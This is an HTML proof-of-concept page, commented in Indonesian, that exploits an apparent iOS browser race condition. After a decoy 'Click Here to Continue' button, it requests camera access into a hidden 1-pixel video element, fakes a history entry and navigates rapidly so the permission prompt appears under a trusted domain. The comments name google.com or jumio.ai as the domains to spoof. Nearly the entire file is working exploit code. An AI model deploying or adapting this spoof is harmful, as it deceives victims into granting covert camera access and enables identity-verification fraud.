<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Camera Permission Spoof</title>
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <style>
      body {
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, system-ui;
        background: #f5f5f7;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }
      .btn-trigger {
        font-size: 18px;
        padding: 14px 28px;
        border-radius: 12px;
        border: none;
        background: #007aff;
        color: #fff;
        font-weight: 600;
        cursor: pointer;
        box-shadow: 0 4px 12px rgba(0,122,255,0.3);
      }
      video {
        display: none;
        width: 1px;
        height: 1px;
      }
    </style>
  </head>
  <body>

    <!-- Tombol ini wajib ada dan diklik untuk memicu permission prompt di iOS -->
    <button id="start-poc" class="btn-trigger" onclick="startExploit()">Click Here to Continue</button>
    
    <video id="video" autoplay playsinline muted></video>

    <script>
      function startExploit() {
        // 1. Sembunyikan tombol segera setelah diklik
        document.getElementById("start-poc").style.display = "none";
        
        // 2. Manipulasi history state agar lebih meyakinkan
        history.pushState({}, "", "/trusted-verification");

        // 3. Picu fungsi kamera dalam jendela waktu (window) race condition
        setTimeout(() => {
          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
              .then((stream) => {
                const video = document.getElementById("video");
                video.srcObject = stream;
              })
              .catch((err) => {
                console.log("Permission denied or error: " + err.message);
              });
          }
        }, 500);

        // 4. Picu race condition navigasi agresif saat siklus rendering berjalan
        requestAnimationFrame(() => {
          requestAnimationFrame(() => {
            setTimeout(() => {
              // Ganti dengan target domain tepercaya yang ingin Anda spoof (misal: google.com atau jumio.ai)
              location.href = "https://google.com:8888"; 
            }, 80);
          });
        });
      }
    </script>
  </body>
</html>
